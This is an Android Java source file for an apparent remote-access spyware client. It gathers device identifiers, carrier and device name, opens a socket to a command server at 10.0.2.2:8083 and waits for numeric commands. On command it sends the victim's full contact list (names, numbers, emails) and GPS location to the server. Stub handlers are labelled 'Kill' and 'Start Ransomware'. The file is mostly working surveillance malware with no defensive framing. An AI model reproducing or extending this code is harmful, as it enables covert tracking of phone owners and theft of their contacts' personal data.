package com.example.client;

import android.Manifest;
import android.bluetooth.BluetoothAdapter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private ActivityResultLauncher<String[]> requestPermissionLauncher;
    private FusedLocationProviderClient fusedLocationClient;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        // Set padding to account for system bars
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Initialize the permission request launcher
        requestPermissionLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestMultiplePermissions(), permissions -> {
                    Boolean readPhoneStateGranted = permissions.get(Manifest.permission.READ_PHONE_STATE);
                    Boolean readPhoneNumbersGranted = permissions.get(Manifest.permission.READ_PHONE_NUMBERS);
                    Boolean bluetoothPermissionGranted = permissions.get(Manifest.permission.BLUETOOTH);
                    Boolean readContactsPermissionGranted = permissions.get(Manifest.permission.READ_CONTACTS);
                    Boolean fineLocationPermissionGranted = permissions.get(Manifest.permission.ACCESS_FINE_LOCATION);
                    Boolean coarseLocationPermissionGranted = permissions.get(Manifest.permission.ACCESS_COARSE_LOCATION);

                    if ((readPhoneStateGranted != null && readPhoneStateGranted) &&
                            (readPhoneNumbersGranted != null && readPhoneNumbersGranted) &&
                            (bluetoothPermissionGranted != null && bluetoothPermissionGranted) &&
                            (readContactsPermissionGranted != null && readContactsPermissionGranted) &&
                            (fineLocationPermissionGranted != null && fineLocationPermissionGranted) &&
                            (coarseLocationPermissionGranted != null && coarseLocationPermissionGranted)) {
                        fetchAndLogDeviceInfo();
                    } else {
                        Log.d(TAG, "Permissions denied");
                    }
                });

        checkAndRequestPermissions();
    }

    private void checkAndRequestPermissions() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            requestPermissionLauncher.launch(new String[]{
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_PHONE_NUMBERS,
                    Manifest.permission.BLUETOOTH,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
            });
        } else {
            fetchAndLogDeviceInfo();
        }
    }

    private void fetchAndLogDeviceInfo() {
        // Get phone ID (ANDROID_ID)
        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        // Get Android version
        String androidVersion = Build.VERSION.RELEASE;

        // Get language
        String language = Locale.getDefault().getLanguage();

        // Get carrier name
        String carrierName = getCarrierName();

        // Get phone name
        String phoneName = getPhoneName();

        // Get country
        String country = getCountry();

        // Log the information
        Log.d(TAG, "Phone ID: " + androidId);
        Log.d(TAG, "Android Version: " + androidVersion);
        Log.d(TAG, "Language: " + language);
        Log.d(TAG, "Carrier: " + carrierName);
        Log.d(TAG, "Phone Name: " + phoneName);
        Log.d(TAG, "Country: " + country);

        String deviceData = "#" + androidId + "," + androidVersion + "," + language + "," + carrierName + "," + country + "," + phoneName;
        Log.d(TAG, "Encoded Device Data: " + deviceData);

        new Thread(() -> connectToServer(deviceData)).start();
    }

    private String getCarrierName() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            SubscriptionManager subscriptionManager = (SubscriptionManager) getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE);
            List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
            if (subscriptionInfoList != null && !subscriptionInfoList.isEmpty()) {
                SubscriptionInfo subscriptionInfo = subscriptionInfoList.get(0);
                return subscriptionInfo.getCarrierName().toString();
            }
        }
        return "Unknown";
    }

    private String getPhoneName() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH) == PackageManager.PERMISSION_GRANTED) {
            BluetoothAdapter myDevice = BluetoothAdapter.getDefaultAdapter();
            if (myDevice != null) {
                return myDevice.getName();
            }
        }
        return "Unknown Device";
    }

    private String getCountry() {
        Locale locale = Locale.getDefault();
        return locale.getCountry();
    }

    private void connectToServer(String deviceData) {
        try (Socket socket = new Socket("10.0.2.2", 8083);
             PrintWriter out = new PrintWriter(new OutputStreamWriter(socket.getOutputStream()), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {

            // Send device data to server
            out.println(deviceData);

            // Listen for commands from the server
            String serverMessage;
            while ((serverMessage = in.readLine()) != null) {
                Log.d(TAG, "Received from server: " + serverMessage);
                if ("45666".equals(serverMessage)) {
                    sendContactsToServer(out);
                }
                if ("00001".equals(serverMessage)) {
                    Log.d(TAG, "Kill - Device");
                }
                if ("6666".equals(serverMessage)) {
                    Log.d(TAG, "Start Ransomware - Device");
                }
                if ("55555".equals(serverMessage)) {
                    Log.d(TAG, "Start Location - Device");
                    // Get and send location data
                    sendLocationToServer(out);
                }
                if ("00200".equals(serverMessage)) {
                    Log.d(TAG, "Disconnect - Device");
                    // Disconnect Client from the server
                    socket.close();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error connecting to server", e);
        }
    }

    private void sendLocationToServer(PrintWriter out) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.getLastLocation()
                    .addOnSuccessListener(this, location -> {
                        if (location != null) {
                            double latitude = location.getLatitude();
                            double longitude = location.getLongitude();
                            String locationData = "55555(" + longitude + "," + latitude + ")";
                            out.println(locationData);
                            Log.d(TAG, "Location sent to server: " + locationData);
                        } else {
                            Log.d(TAG, "Location is null");
                        }
                    });
        } else {
            Log.d(TAG, "Location permissions not granted");
        }
    }

    private void sendContactsToServer(PrintWriter out) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if (cursor != null) {
                StringBuilder contactsData = new StringBuilder("45666{");
                boolean firstContact = true;
                while (cursor.moveToNext()) {
                    int idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
                    int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);

                    if (idIndex >= 0 && nameIndex >= 0) {
                        String id = cursor.getString(idIndex);
                        String name = cursor.getString(nameIndex);
                        String phoneNumber = null;
                        String email = null;

                        Cursor phoneCursor = getContentResolver().query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id},
                                null
                        );

                        if (phoneCursor != null && phoneCursor.moveToFirst()) {
                            int phoneIndex = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                            if (phoneIndex >= 0) {
                                phoneNumber = phoneCursor.getString(phoneIndex);
                            }
                            phoneCursor.close();
                        }

                        Cursor emailCursor = getContentResolver().query(
                                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                                new String[]{id},
                                null
                        );

                        if (emailCursor != null && emailCursor.moveToFirst()) {
                            int emailIndex = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS);
                            if (emailIndex >= 0) {
                                email = emailCursor.getString(emailIndex);
                            }
                            emailCursor.close();
                        }

                        if (!firstContact) {
                            contactsData.append(", ");
                        }
                        firstContact = false;

                        contactsData.append("(").append(id).append(", ").append(name).append(", ")
                                .append(phoneNumber != null ? phoneNumber : "No Phone").append(", ")
                                .append(email != null ? email : "No Email").append(")");
                    }
                }
                cursor.close();
                contactsData.append("}");

                // Send all contacts data in one go
                out.println(contactsData.toString());
            }
        } else {
            Log.d(TAG, "READ_CONTACTS permission not granted");
        }
    }
}
